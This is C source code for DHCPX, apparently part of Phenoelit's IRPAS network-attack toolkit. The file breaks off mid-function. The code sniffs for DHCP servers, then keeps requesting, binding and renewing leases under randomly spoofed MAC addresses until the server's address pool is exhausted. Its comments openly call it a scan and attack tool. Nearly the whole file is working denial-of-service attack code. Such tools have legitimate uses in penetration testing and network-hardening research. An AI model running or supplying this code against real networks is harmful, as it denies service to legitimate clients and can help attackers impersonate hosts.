/* DHCPX
 * Dynamic Host Confusion Program ;)
 *
 * FX <fx@phenoelit.de>
 * Phenoelit (http://www.phenoelit.de)
 * (c) 2k
 *
 * $Id: dhcpx.c,v 1.4 2001/12/28 14:04:36 fx Exp fx $
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <math.h>
#include <signal.h>

#include "protocols.h"
#include "packets.h"
#include "build.h"

/* we need a sniffer enigine here */
#include <pcap.h>
#include <net/bpf.h>

/* definitions */
#define IP_BCAST	"255.255.255.255"
#define CAPLENGTH	1542
#define DEST_LENGTH	15

#define BANNER		"DHCPx $Revision: 1.4 $\n"\
			"\t(c) 2k++ FX <fx@phenoelit.de>\n"\
			"\tPhenoelit (http://www.phenoelit.de)\n"

#define REQ_TIMEOUT	10	

#define LEASE_STAT_NEW		0
#define LEASE_STAT_REQUEST	1	
#define LEASE_STAT_ACTIVE	2
#define LEASE_STAT_RELEASE	100
typedef struct {
    struct in_addr	addr;
    u_char		hwaddr[6];
    u_int32_t		xid;
    unsigned long	since;
    unsigned long	renew;
    unsigned int	status;
    void		*next;
} lease_t;

typedef struct {
    struct in_addr	addr;
    lease_t		*leases;
    void		*next;
} server_t;

typedef struct {
    struct in_addr	addr;
    u_char		hwaddr[6];
    unsigned long	since;
    void		*next;
} arpcache_t;

/* config */
#define CFG_DISCOVER_TIME	3
#define CFG_ARP_TIME		3
struct {
    int			verbose;
    char		*device;

    int			set_dest;
    struct in_addr	dest;

    int			active;
    unsigned int	discover_time;
    unsigned int	arp_time;
} cfg;

/************************************
 * globals */
u_char			*rawpacket;
int			atsock;
pcap_t			*cap;
int			stop_flag=0;
int			accept_offers=0;
server_t		*servers=NULL;
arpcache_t		*arp=NULL;


/************************************
 * prototypes */
void	usage(char *n);

/* PCAP */
int     initialize_pcap(void);
void	signaler(int sig);
void	evaluate_packet(u_char *frame,int frame_length);
void 	net_listen(void);
void	dhcpx_shutdown(void);

u_char	*construct_arp_frame(int *fsize, struct in_addr *dest);
u_char	*construct_dhcp_discover_frame(int *fsize,
	struct in_addr *saddr,lease_t *l);
u_char	*construct_dhcp_request_frame(int *fsize,
	struct in_addr *saddr,lease_t *l);

void	arp_add(struct in_addr *addr, u_char *hwaddr);
u_char	*arp_find(struct in_addr *addr);
void	server_add(struct in_addr *srvaddr);
server_t *get_server(struct in_addr *saddr);
int	server_open_leases(server_t *s);
void	server_request_lease(server_t *s);
void	server_age_leases(server_t *s);
lease_t *server_find_lease(server_t *s,u_char *hwaddr,unsigned long xid);
void	server_update_lease(struct in_addr *srvaddr,
	u_char *hwaddr, unsigned long xid, 
	struct in_addr *clientip, unsigned long renew,
	unsigned int status);
void	server_bind_leases(server_t *s);
void	server_age_attempts(server_t *s);


/* the main function */
int	main(int argc, char **argv) {
    char		option;
    extern char		*optarg;
    unsigned long	t1,tx1,tx2;
    unsigned int	flen;
    server_t		*sv=NULL;

    memset(&cfg,0,sizeof(cfg));
    cfg.discover_time=CFG_DISCOVER_TIME;
    cfg.arp_time=CFG_ARP_TIME;
    while ((option=getopt(argc,argv,"vAi:t:u:D:"))!=EOF) {
	switch (option) {
	    case 'v':	/* verbose */
			cfg.verbose++;
			break;
	    case 'A':	/* active ! */
			cfg.active++;
			break;
	    case 'i':	/* local network device */
			cfg.device=smalloc(strlen(optarg)+1);
			strcpy(cfg.device,optarg);
			break;
	    case 'D':	/* set destination */
			if (inet_aton(optarg,&(cfg.dest))==0) {
			    fprintf(stderr,
				    "dest. IP address seems to be wrong\n");
			    return (1);
			}
			cfg.set_dest++;
			break;
	    case 't':	/* discover time */
			cfg.discover_time=atoi(optarg);
			break;
	    case 'u':	/* arp time */
			cfg.arp_time=atoi(optarg);
			break;
	    default:	usage(argv[0]);
	}
    }

    if (!cfg.device) usage(argv[0]);
    if (!cfg.set_dest) 
	inet_aton(IP_BCAST,&(cfg.dest));

    /* set up socket ... */
    if ((atsock=init_socket_eth(cfg.device))==(-1)) return(1);
    /* set up sniffer */
    if (initialize_pcap()==(-1)) return (1);

    /* signal handling */
    signal(SIGTERM,&signaler);
    signal(SIGINT,&signaler);
    srand((unsigned int)time(NULL));

    /* my shit */
    printf(BANNER); printf("\tIRPAS build %s\n",BUILD);

    /* if verbose, print options selected */
    if (cfg.verbose) {
	printf("\tScan/attack destination is %s\n",inet_ntoa(cfg.dest));
	printf("\tdiscovery will run for %u seconds\n",cfg.discover_time);
	printf("\tARP will run for %u seconds\n",cfg.arp_time);
    }

    /* if destination is set, ARP for it ;) */
    if (cfg.set_dest) {
	if (cfg.verbose) printf("ARPing for destination address ...\n");
	t1=(unsigned long)time(NULL);
	tx2=(unsigned long)time(NULL);
	while ((t1+cfg.arp_time>=(unsigned long)time(NULL))&&(!stop_flag)) {
	    tx1=(unsigned long)time(NULL);
	    if (tx1!=tx2) {
		rawpacket=construct_arp_frame(&flen,&(cfg.dest));
		sendpack_eth(cfg.device,atsock,rawpacket,flen);
		free(rawpacket);
		tx2=(unsigned long)time(NULL);
	    }
	    net_listen();
	}
	if (arp_find(&(cfg.dest))==NULL) {
	    fprintf(stderr,"Could not ARP the hw address of destination %s\n",
		    inet_ntoa(cfg.dest));
	    return 1;
	}
    }


    /* send out DHCPDISCOVER stuff */
    if (cfg.verbose) printf("Discovering DHCP servers ...\n");
    t1=(unsigned long)time(NULL);
    tx2=(unsigned long)time(NULL);
    while ((t1+cfg.discover_time>=(unsigned long)time(NULL))&&(!stop_flag)) {
	tx1=(unsigned long)time(NULL);
	if (tx1!=tx2) {
	    rawpacket=construct_dhcp_discover_frame(&flen,NULL,NULL);
	    sendpack_eth(cfg.device,atsock,rawpacket,flen);
	    free(rawpacket);
	    tx2=(unsigned long)time(NULL);
	}
	net_listen();
    }

    if (servers==NULL) {
	printf("No DHCP servers found. Use -D option for a specific one\n");
	pcap_close(cap);
	close(atsock);
	dhcpx_shutdown();
	return (2);
    }

    /* now we know all servers - let's accept the offers now */
    accept_offers=1;

    if (cfg.verbose) printf("Entering main loop ... (press CTRL-C to finish)\n");
    tx2=(unsigned long)time(NULL);
    while (!stop_flag) {
	if (sv==NULL) sv=servers;

	tx1=(unsigned long)time(NULL);
	if (tx1!=tx2) {
	    if (server_open_leases(sv)==0) 
		server_request_lease(sv);
	    server_bind_leases(sv);
	    server_age_leases(sv);
	    server_age_attempts(sv);
	    
	    sv=sv->next;
	    tx2=(unsigned long)time(NULL);
	    printf("..ooo0000ooo..\n");
	}

	net_listen();
	usleep(10000);
    }

    /* at the end of the day, close our socket */
    //pcap_close(cap);
    close(atsock);
    dhcpx_shutdown();

    return (0);
}




/********************** FUNCTIONS **********************/

void 	net_listen(void) {
    u_char		*pcap_data, *ppacket;
    struct pcap_pkthdr	pcap_head,phead;

    if ((pcap_data=(u_char *)pcap_next(cap,&pcap_head))!=NULL) {
	/* make a local copy of the data, 
	 * pcap will overwrite the buffer if needed */
	
	memcpy(&phead,&pcap_head,sizeof(struct pcap_pkthdr));
	ppacket=(u_char *)smalloc(phead.caplen);
	memcpy(ppacket,pcap_data,phead.caplen);

	evaluate_packet(ppacket,phead.caplen);

	free(ppacket);
    } 
}

void	evaluate_packet(u_char *frame,int frame_length) {
    struct ether_header		*eth;
    iphdr_t			*ip;
    udphdr_t			*udp;
    dhcp_t			*dhcp;
    dhcp_option_t		*dhcpo;
    arphdr_t			*arp;
    /* dhcp related */
    struct in_addr		serverid;
    struct in_addr		clientip;
    unsigned short		dhcpop;
    unsigned long		dhcp_renew,xid;


    memset(&serverid,0,sizeof(serverid));
    memset(&clientip,0,sizeof(clientip));

    if (cfg.verbose>2) printf("-- Packet\n");

    eth=(struct ether_header *)frame;
    if (ntohs(eth->ether_type)==ETHERTYPE_IP) {

	if (cfg.verbose>2) printf("--- IP\n");
	ip=(iphdr_t *)(frame+sizeof(struct ether_header));

	/* if it is from myself, igore it */
	if (!memcmp(&(ip->saddr),
		    &(packet_ifconfig.ip.s_addr),IP_ADDR_LEN)) return;
	if (cfg.verbose>2) printf("--- foreign\n");

	if (ip->protocol==IPPROTO_UDP) {
	    if (cfg.verbose>2) printf("---- udp\n");
	    udp=(udphdr_t *)(frame+sizeof(struct ether_header)+
		    sizeof(iphdr_t));
	    if (ntohs(udp->dport)==68) {
		/* check the size of the frame */
		if ((sizeof(struct ether_header)+sizeof(iphdr_t)+
			sizeof(udphdr_t)+sizeof(dhcp_t)+sizeof(dhcp_option_t))
			>frame_length) {
		    if (cfg.verbose) 
			printf("----- BOOTP server->client to small (%u)\n",
				frame_length);
		    return;
		}
		/* the DHCP header */
		dhcp=(dhcp_t *)(frame+sizeof(struct ether_header)+
			sizeof(iphdr_t)+sizeof(udphdr_t));
		memcpy(&(clientip.s_addr),&(dhcp->yiaddr),IP_ADDR_LEN);
		xid=(unsigned long)ntohl(dhcp->transid);
		dhcpo=(dhcp_option_t *)(frame+sizeof(struct ether_header)+
			sizeof(iphdr_t)+sizeof(udphdr_t)+sizeof(dhcp_t));
		dhcpop=0xFF;

		/* scan the remaining options for interesting information */
		do {
		    if (dhcpo->type==54 /* Server ID */) {
			memcpy(&(serverid.s_addr),&(dhcpo->value),IP_ADDR_LEN);
		    } else if (dhcpo->type==53 /* message type */) {
			dhcpop=dhcpo->value;
		    } else if (dhcpo->type==58 /* renewal time */) {
			dhcp_renew=(unsigned long)ntohl(
				*((u_int32_t *)&(dhcpo->value)));
		    }

		    dhcpo=(dhcp_option_t *)
			((u_char*)dhcpo+dhcpo->length+2);
		} while (
			(((u_char*)dhcpo-frame)<frame_length) // length 
			&& (dhcpo->type!=0xFF) // option end 
			);
		/* at this point, we know the options and what the server 
		 * identifier is. Now, we can decide what to do ;) */
		if (dhcpop==DHCPOFFER) {
		    //printf("DEBUG: Offer from %s (xid: %lu)\n",
			    //inet_ntoa(ip->saddr),xid);
		    if (!accept_offers) {
			/* we are still in reconnaissance phase */
			arp_add(&serverid,(u_char *)&(eth->ether_shost));
			server_add(&serverid);
		    } else {
			server_update_lease(&serverid,
				(u_char *)&(dhcp->chaddr),xid,
				&clientip,dhcp_renew,LEASE_STAT_REQUEST);
		    } // end of active collection
		} else if (dhcpop==DHCPACK) {
		    server_update_lease(&serverid,
			    (u_char *)&(dhcp->chaddr),xid,
			    &clientip,dhcp_renew,LEASE_STAT_ACTIVE);
		} else if (dhcpop==0xFF) {
		    printf("The DHCP packet (%s",inet_ntoa(ip->saddr));
		    printf("->%s) did not contain a DHCP message type\n",
			    inet_ntoa(ip->daddr));
		}

	    } /* end of BOOTP client packet */
	} /* end of UDP */
    } /* not IP */ else if (ntohs(eth->ether_type)==ETHERTYPE_ARP) {
	if (cfg.verbose>2) printf("--- ARP\n");
	arp=(arphdr_t *)(frame+sizeof(struct ether_header));
	if (ntohs(arp->opcode)==ARPOP_REPLY) {
	    struct in_addr	tip;

	    if (cfg.verbose>2) printf("---- ARP reply\n");
	    memset(&tip,0,sizeof(tip));
	    memcpy(&(tip.s_addr),&(arp->sip),IP_ADDR_LEN);
	    arp_add(&tip,(u_char*)&(arp->sha));
	}
    }
    return;
}


u_char	*construct_arp_frame(int *fsize, struct in_addr *dest) {
    u_char			*packet;
    struct ether_header		*eth;
    arphdr_t			*arp;
    int				i;

    *fsize=sizeof(arphdr_t)+sizeof(struct ether_header);
    packet=(u_char *)smalloc(*fsize+3);

    /* ethernet part */
    eth=(struct ether_header *)packet;
    memset(&(eth->ether_dhost),0xFF,ETH_ALEN);
    for(i=0;i<ETH_ALEN;i++) {
	eth->ether_shost[i]=1+(int) (255.0*rand()/(RAND_MAX+1.0));
    }
    /* prevent the MSB in the first octet from being set */
    eth->ether_shost[0]=eth->ether_shost[0]&0x7F;
    eth->ether_type=htons(0x0806);

    arp=(arphdr_t *)(packet+sizeof(struct ether_header));
    arp->hardware=htons(1);
    arp->protocol=htons(0x0800);
    arp->hw_size=6;
    arp->proto_size=4;
    arp->opcode=htons(ARPOP_REQUEST);
    memcpy(&(arp->sha),&(eth->ether_shost),ETH_ALEN);
    /*
     * for(i=0;i<IP_ADDR_LEN;i++) {
	arp->sip[i]=1+(int) (255.0*rand()/(RAND_MAX+1.0));
     * }
     */
    memcpy(&(arp->sip),&(packet_ifconfig.ip.s_addr),IP_ADDR_LEN);
    memcpy(&(arp->tip),&(dest->s_addr),IP_ADDR_LEN);

    return packet;
}


/* creates an anonymous discover frame if saddr=l=NULL
 * creates an unicast discover frame if saddr=l!=NULL */
u_char	*construct_dhcp_discover_frame(int *fsize,
	struct in_addr *saddr,lease_t *l) {
    u_char			*packet;
    struct ether_header		*eth;
    iphdr_t			*ip;
    udphdr_t			*udp;
    dhcp_t			*dhcp;
    dhcp_option_t		*dhcpo;
    int				i;
    u_int16_t			cs;
    unsigned char		optionlist[] = {
					1 /* subnet */,
					3 /* router */,
					6 /* DNS */,
    					15 /* domain name */};
/*
#define DSIZE	(sizeof(iphdr_t)			\
		+sizeof(udphdr_t)			\
		+sizeof(dhcp_t) 			\
		+4*sizeof(dhcp_option_t)		\
		+sizeof(optionlist)			\
		+6+1)	*/
#define DSIZE	300			// empiric value ?!?

    packet=(u_char *)smalloc(DSIZE+sizeof(struct ether_header)+3);
    *fsize=DSIZE+sizeof(struct ether_header);

    /* ethernet part */
    eth=(struct ether_header *)packet;
    if (saddr==NULL) {
	if (cfg.set_dest) {
	    u_char		*dhwa;

	    if ((dhwa=arp_find(&(cfg.dest)))==NULL) {
		fprintf(stderr,"ERROR: HW addr of destination unknown !\n");
		exit(1);
	    }
	    memcpy(&(eth->ether_dhost),dhwa,ETH_ALEN);
	} else {
	    memset(&(eth->ether_dhost),0xFF,ETH_ALEN);
	}
    } else {
	u_char		*dhwa;

	if ((dhwa=arp_find(saddr))==NULL) {
	    fprintf(stderr,"ERROR: HW addr of server %s unknown !\n",
		    inet_ntoa(*saddr));
	    exit(1);
	}
	memcpy(&(eth->ether_dhost),dhwa,ETH_ALEN);
    }

    if (l==NULL) {
	for(i=0;i<ETH_ALEN;i++) {
	    eth->ether_shost[i]=1+(int) (255.0*rand()/(RAND_MAX+1.0));
	}
	/* prevent the MSB in the first octet from being set */
	eth->ether_shost[0]=eth->ether_shost[0]&0x7F;
    } else {
	memcpy(&(eth->ether_shost),&(l->hwaddr),ETH_ALEN);
    }
    eth->ether_type=htons(0x0800);

    /* IP part */
    ip=(iphdr_t *)(packet+sizeof(struct ether_header));
    ip->version=4;
    ip->ihl=sizeof(iphdr_t)/4;
    ip->tot_len=htons(DSIZE);
    ip->ttl=0x80;
    ip->protocol=IPPROTO_UDP;
    ip->id=htons(1+(int) (65535.0*rand()/(RAND_MAX+1.0)));
    // source stays 0.0.0.0
    /* IMPORTANT: DISCOVER frames have to be IP broadcast ! */
    memset(&(ip->daddr.s_addr),0xFF,IP_ADDR_LEN);
    cs=chksum((u_char *)ip,sizeof(iphdr_t));
    ip->check=cs;

    /* UDP header */
    udp=(udphdr_t *)((u_char *)ip+sizeof(iphdr_t));
    udp->sport=htons(DHCP_CLIENT_PORT);
    udp->dport=htons(DHCP_SERVER_PORT);
    udp->length=htons(DSIZE-sizeof(iphdr_t));

    /* BOOTP header */
    dhcp=(dhcp_t *)((u_char *)udp+sizeof(udphdr_t));
    dhcp->msgtype=1;
    dhcp->hwtype=1;
    dhcp->hwalen=6;
    dhcp->hops=0;
    if (l==NULL)
	dhcp->transid=(u_int32_t)htonl(
		1+(unsigned long)(4294967293.0*rand()/(RAND_MAX+1.0)));
    else
	dhcp->transid=(u_int32_t)htonl(l->xid);
    memcpy(&(dhcp->chaddr),&(eth->ether_shost),ETH_ALEN);

    dhcp->cookie[0]=0x63; dhcp->cookie[1]=0x82; 
    dhcp->cookie[2]=0x53; dhcp->cookie[3]=0x63;

    /* DHCP options */
    dhcpo=(dhcp_option_t *)((u_char *)dhcp+sizeof(dhcp_t));
    dhcpo->type=53; dhcpo->length=1; dhcpo->value=DHCPDISCOVER;

    /* next option ... (PARAMETERS) */
    dhcpo=(dhcp_option_t *)((u_char *)dhcpo+((dhcp_option_t *)dhcpo)->length+2);
    dhcpo->type=DHCP_OPTION_PARAMETERS;
    dhcpo->length=sizeof(optionlist);
    memcpy(&(dhcpo->value),optionlist,sizeof(optionlist));

    /* next option ... (CLient identifier) */
    dhcpo=(dhcp_option_t *)((u_char *)dhcpo+((dhcp_option_t *)dhcpo)->length+2);
    dhcpo->type=DHCP_OPTION_CLIENTID;
    dhcpo->length=ETH_ALEN+1;
    dhcpo->value=0x01;	/* ethernet */
    memcpy((char *)&(dhcpo->value)+1,&(eth->ether_shost),ETH_ALEN);

    /* next option ... */
    dhcpo=(dhcp_option_t *)((u_char *)dhcpo+((dhcp_option_t *)dhcpo)->length+2);
    dhcpo->type=0xFF; 

    return packet;
}


u_char	*construct_dhcp_request_frame(int *fsize,
	struct in_addr *saddr,lease_t *l) {
    u_char			*packet;
    struct ether_header		*eth;
    iphdr_t			*ip;
    udphdr_t			*udp;
    dhcp_t			*dhcp;
    dhcp_option_t		*dhcpo;
    u_int16_t			cs;
    u_char			*dhwa;
    unsigned char		optionlist[] = {
					1 /* subnet */,
					3 /* router */,
					6 /* DNS */,
    					15 /* domain name */};

#define SIZE	(sizeof(iphdr_t)			\
		+sizeof(udphdr_t)			\
		+sizeof(dhcp_t) 			\
		+4*sizeof(dhcp_option_t)		\
		+sizeof(optionlist)			\
		+6+1 /* ethernet addr */ 		\
		+6 /* for serverid */			\
		+6 /* for requested IP */)	

    packet=(u_char *)smalloc(SIZE+sizeof(struct ether_header)+3);
    *fsize=SIZE+sizeof(struct ether_header);

    /* ethernet part */
    eth=(struct ether_header *)packet;
    if ((dhwa=arp_find(saddr))==NULL) {
	fprintf(stderr,"ERROR: HW addr of destination unknown !\n");
	exit(1);
    }
    memcpy(&(eth->ether_dhost),dhwa,ETH_ALEN);

    memcpy(&(eth->ether_shost),&(l->hwaddr),ETH_ALEN);
    eth->ether_type=htons(0x0800);

    /* IP part */
    ip=(iphdr_t *)(packet+sizeof(struct ether_header));
    ip->version=4;
    ip->ihl=sizeof(iphdr_t)/4;
    ip->tot_len=htons(SIZE);
    ip->ttl=0x80;
    ip->protocol=IPPROTO_UDP;
    ip->id=htons(1+(int) (65535.0*rand()/(RAND_MAX+1.0)));
	// source stays 0.0.0.0
    memcpy(&(ip->saddr.s_addr),&(l->addr.s_addr),IP_ADDR_LEN); 
    memcpy(&(ip->daddr.s_addr),&(saddr->s_addr),IP_ADDR_LEN);
    cs=chksum((u_char *)ip,sizeof(iphdr_t));
    ip->check=cs;

    /* UDP header */
    udp=(udphdr_t *)((u_char *)ip+sizeof(iphdr_t));
    udp->sport=htons(DHCP_CLIENT_PORT);
    udp->dport=htons(DHCP_SERVER_PORT);
    udp->length=htons(SIZE-sizeof(iphdr_t));

    /* BOOTP header */
    dhcp=(dhcp_t *)((u_char *)udp+sizeof(udphdr_t));
    dhcp->msgtype=1;
    dhcp->hwtype=1;
    dhcp->hwalen=6;
    dhcp->hops=0;
    dhcp->transid=(u_int32_t)htonl(l->xid);
    memcpy(&(dhcp->chaddr),&(l->hwaddr),ETH_ALEN);
    // Prohibited by RFC 2131 
    //memcpy(&(dhcp->ciaddr),&(l->addr.s_addr),IP_ADDR_LEN); 

    dhcp->cookie[0]=0x63; dhcp->cookie[1]=0x82; 
    dhcp->cookie[2]=0x53; dhcp->cookie[3]=0x63;

    /* DHCP options */
    dhcpo=(dhcp_option_t *)((u_char *)dhcp+sizeof(dhcp_t));
    dhcpo->type=53; dhcpo->length=1; dhcpo->value=DHCPREQUEST;

    /* next option ... (PARAMETERS) */
    dhcpo=(dhcp_option_t *)((u_char *)dhcpo+((dhcp_option_t *)dhcpo)->length+2);
    dhcpo->type=DHCP_OPTION_PARAMETERS;
    dhcpo->length=sizeof(optionlist);
    memcpy(&(dhcpo->value),optionlist,sizeof(optionlist));

    /* next option ... (CLient identifier) */
    dhcpo=(dhcp_option_t *)((u_char *)dhcpo+((dhcp_option_t *)dhcpo)->length+2);
    dhcpo->type=DHCP_OPTION_CLIENTID;
    dhcpo->length=ETH_ALEN+1;
    dhcpo->value=0x01;	/* ethernet */
    memcpy((char *)&(dhcpo->value)+1,&(eth->ether_shost),ETH_ALEN);

    /* OPTION SERVER IDENTIFIER */
    dhcpo=(dhcp_option_t *)((u_char *)dhcpo+((dhcp_option_t *)dhcpo)->length+2);
    dhcpo->type=54; dhcpo->length=4;
    memcpy(&(dhcpo->value),&(saddr->s_addr),IP_ADDR_LEN);

    /* OPTION REQUESTED IP */
    dhcpo=(dhcp_option_t *)((u_char *)dhcpo+((dhcp_option_t *)dhcpo)->length+2);
    dhcpo->type=50; dhcpo->length=4;
    memcpy(&(dhcpo->value),&(l->addr.s_addr),IP_ADDR_LEN);

    dhcpo=(dhcp_option_t *)((u_char *)dhcpo+((dhcp_option_t *)dhcpo)->length+2);
    dhcpo->type=0xFF; 

    return packet;
}


void	signaler(int sig) {
    stop_flag++;
    if (cfg.verbose>2)
	fprintf(stderr,"\nSignal received.\n");
    pcap_close(cap);
}


int	initialize_pcap(void) {
#define PATTERNSTRING	"not ether host "
//    			"00:00:00:00:00:00"
#define IPSTRLEN	18
    char                pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
    struct bpf_program  cfilter;                   /* the compiled filter */
    bpf_u_int32		network,netmask;

    char		tipstr[IPSTRLEN+1];
    char		*notfilter;

    /* prepare filter */
    memset(&tipstr,0,IPSTRLEN+1);
    snprintf(tipstr,IPSTRLEN,"%02X:%02X:%02X:%02X:%02X:%02X",
	    packet_ifconfig.eth.ether_addr_octet[0],
	    packet_ifconfig.eth.ether_addr_octet[1],
	    packet_ifconfig.eth.ether_addr_octet[2],
	    packet_ifconfig.eth.ether_addr_octet[3],
	    packet_ifconfig.eth.ether_addr_octet[4],
	    packet_ifconfig.eth.ether_addr_octet[5]);
    notfilter=(char *)smalloc(strlen(PATTERNSTRING)+IPSTRLEN+1);
    strcpy(notfilter,PATTERNSTRING);
    strcat(notfilter,tipstr);

    /* get my network and netmask */
    if (pcap_lookupnet(cfg.device,&network,&netmask,pcap_err)!=0) {
	fprintf(stderr,"pcap_lookupnet(): %s\n",pcap_err);
	return (-1);
    }

    /* open the sniffer */
    if ((cap=pcap_open_live(cfg.device,CAPLENGTH,
		    1, /* in promi mode */
		    100, /* timeouts work with this version of pcap*/
		    pcap_err))==NULL) {
	fprintf(stderr,"pcap_open_live(): %s\n",pcap_err);
	return (-1);
    }

    if (pcap_datalink(cap)!=DLT_EN10MB) {
	fprintf(stderr,"works on Ethernet only, sorry.\n");
	return (-1);
    }

    if (pcap_compile(cap,&cfilter,notfilter,0,netmask)!=0) {
	pcap_perror(cap,"pcap_compile()");
	return (-1);
    }

    if (pcap_setfilter(cap,&cfilter)!=0) {
	pcap_perror(cap,"pcap_setfilter()");
	return (-1);
    }
    
    free(notfilter);

    return 0;
}


void	usage(char *n) {
    printf(
	    "%s [-v[v[v]]] -i <interface> [-A] \n"
	    "\t[-D <destination ip>]\n"
	    "\t[-t <discovery time in secs>]\n"
	    "\t[-u <ARP time in secs>]\n",
	    n);
    exit (1);
}


void arp_add(struct in_addr *addr, u_char *hwaddr) {
    arpcache_t		*a,*a2;
    
    a2=arp;
    if (a2==NULL) {
	a=smalloc(sizeof(arpcache_t));
	arp=a;
    } else {
	while (a2!=NULL) {
	    if (!memcmp(&(a2->addr.s_addr),&(addr->s_addr),IP_ADDR_LEN)) {
		if (cfg.verbose>=2) 
		    printf("ARP: %s known - updated\n",inet_ntoa(*addr));
		memcpy(&(a2->hwaddr),hwaddr,ETH_ALEN);
		return;
	    }
	    a2=a2->next;
	}
	/* go to the last entry */
	a2=arp;
	while (a2->next!=NULL) a2=a2->next;
	a=smalloc(sizeof(arpcache_t));
	a2->next=a;
    }

    if (cfg.verbose>=2) 
	printf("ARP: %s new\n",inet_ntoa(*addr));
    memcpy(&(a->addr.s_addr),&(addr->s_addr),IP_ADDR_LEN);
    memcpy(&(a->hwaddr),hwaddr,ETH_ALEN);
    a->since=(unsigned long)time(NULL);
}


u_char *arp_find(struct in_addr *addr) {
    arpcache_t		*a;

    a=arp;
    while (a!=NULL) {
	if (!memcmp(&(a->addr.s_addr),&(addr->s_addr),IP_ADDR_LEN))
	    return a->hwaddr;
	else
	    a=a->next;
    }
    return NULL;
}


void server_add(struct in_addr *srvaddr) {
    server_t		*s,*s2;
    time_t		tempt;

    time(&tempt);

    s=servers;
    if (s==NULL) {
	s=(server_t*)smalloc(sizeof(server_t));
	servers=s;
    } else {
	s2=servers;
	while (s2!=NULL) {
	    if (!memcmp(&(s2->addr.s_addr),&(srvaddr->s_addr),IP_ADDR_LEN)) {
		if (cfg.verbose>=2) 
		    printf("Server %s already known\t%s\n",
			    inet_ntoa(*srvaddr),ctime(&tempt));
		return;
	    }
	    s2=s2->next;
	}
	s2=servers;
	while(s2->next!=NULL) s2=s2->next;
	s=(server_t *)smalloc(sizeof(server_t));
	s2->next=s;
    }
    memcpy(&(s->addr.s_addr),&(srvaddr->s_addr),IP_ADDR_LEN);
    if (cfg.verbose) 
	printf("Added server %s\n",inet_ntoa(*srvaddr));
}


server_t *get_server(struct in_addr *saddr) {
    server_t		*s;

    if ((s=servers)==NULL) return NULL;

    while (s!=NULL) {
	if (!memcmp(&(s->addr.s_addr),&(saddr->s_addr),IP_ADDR_LEN)) 
	    return s;
	s=s->next;
    }
    return NULL;
}


/* returns:
 * 	-1 on error
 * 	0  if no open (unack'd leases) 
 * 	1 or more  if open leases exist
 */
int server_open_leases(server_t *s) {
    lease_t		*l;
    int			retval=0;

    if (s==NULL) return (-1);
    if ((l=s->leases)==NULL) return (0);

    while (l!=NULL) {
	if (l->status==LEASE_STAT_NEW) retval++;
	l=l->next;
    }
    return retval;
}


void server_request_lease(server_t *s) {
    lease_t		*l,*l2;
    int			i;
    u_char		*frame;
    unsigned int	flen;

    if ((l=s->leases)==NULL) {
	l=(lease_t *)smalloc(sizeof(lease_t));
	s->leases=l;
    } else {
	l2=s->leases;
	while (l2->next!=NULL) l2=l2->next;
	l=(lease_t *)smalloc(sizeof(lease_t));
	l2->next=l;
    }

    l->status=LEASE_STAT_NEW;
    l->xid=1+(unsigned long)(4294967293.0*rand()/(RAND_MAX+1.0));
    for(i=0;i<ETH_ALEN;i++) {
	l->hwaddr[i]=1+(int) (255.0*rand()/(RAND_MAX+1.0));
    }
    /* prevent the MSB in the first octet from being set */
    l->hwaddr[0]=l->hwaddr[0]&0x7F;
    l->since=(unsigned long)time(NULL);

    frame=construct_dhcp_discover_frame(&flen,&(s->addr),l);
    sendpack_eth(cfg.device,atsock,frame,flen);
    free(frame);

    if (cfg.verbose) 
	printf("Requesting new lease from server %s\n",inet_ntoa(s->addr));
}


void server_age_leases(server_t *s) {
    lease_t		*l;
    u_char		*frame;
    unsigned int	flen;

    if ((l=s->leases)==NULL) return;
    while (l!=NULL) {
	if ((l->status==LEASE_STAT_ACTIVE)
		&&(l->renew<=(unsigned long)time(NULL))
		&&(l->since!=0)) {
	    if (cfg.verbose) {
		printf("Lease %s ",inet_ntoa(l->addr));
		printf("from server %s needs renewal\n",inet_ntoa(s->addr));
	    }
	    frame=construct_dhcp_request_frame(
		    &flen,(struct in_addr *)&(s->addr.s_addr),l);
	    sendpack_eth(cfg.device,atsock,frame,flen);
	    free(frame);
	}
	l=l->next;
    }
}


lease_t *server_find_lease(server_t *s,u_char *hwaddr,unsigned long xid) {
    lease_t		*l;

    if ((l=s->leases)==NULL) return NULL;
    while (l!=NULL) {
	if ((!memcmp(&(l->hwaddr),hwaddr,ETH_ALEN))
		&&(l->xid==xid)) {
	    return l;
	}
	l=l->next;
    }
    return NULL;
}


void server_update_lease(struct in_addr *srvaddr,
	u_char *hwaddr, unsigned long xid, 
	struct in_addr *clientip, unsigned long renew,
	unsigned int status) {
    server_t		*s;
    lease_t		*l;

    if ((s=get_server(srvaddr))!=NULL) {
	if ((l=server_find_lease(s,hwaddr,xid))!=NULL){
	    memcpy(&(l->addr.s_addr),&(clientip->s_addr),IP_ADDR_LEN);
	    l->since=(unsigned long)time(NULL);
	    if (renew!=0) {
		/* I could update the lease in half the update time - but since
		 * we are not following the process correctly (that's what this 
		 * tool is about - isn't it?) it is OK to observe the normal 
		 * renewal time 
		 * l->renew=(unsigned long)time(NULL)+renew/2;
		 */
		l->renew=(unsigned long)time(NULL)+renew;
		if (cfg.verbose>=2) 
		    printf("\rRenewal is in %lu secs\n",
			    (unsigned long)(l->renew)-(unsigned long)time(NULL));
	    } else {
		/* DEFAULT= 60 sec */
		l->renew=(unsigned long)time(NULL)+60;
	    }
	    l->status=status;
	    if (cfg.verbose) {
		printf("Updated lease %s",inet_ntoa(*clientip));
		printf(" from server %s\n",inet_ntoa(*srvaddr));
	    }
	} else {
	    if (cfg.verbose)
		printf("Unknown lease from server %s\n",inet_ntoa(*srvaddr));
	}
    } else {
	if (cfg.verbose)
	    printf("Unknown server %s\n",inet_ntoa(*srvaddr));
    }
}


void server_bind_leases(server_t *s) {
    lease_t		*l;
    u_char		*frame;
    unsigned int	flen;

    if ((l=s->leases)==NULL) return;
    while (l!=NULL) {
	if (l->status==LEASE_STAT_REQUEST) {
	    frame=construct_dhcp_request_frame(
		    &flen,(struct in_addr *)&(s->addr.s_addr),l);
	    sendpack_eth(cfg.device,atsock,frame,flen);
	    free(frame);
	    l->status=LEASE_STAT_ACTIVE;
	    if (cfg.verbose>=2) {
		printf("Lease %s ",inet_ntoa(l->addr));
		printf("from server %s will bound\n",
			inet_ntoa(s->addr));
	    }
	}
	l=l->next;
    }
}


void server_age_attempts(server_t *s) {
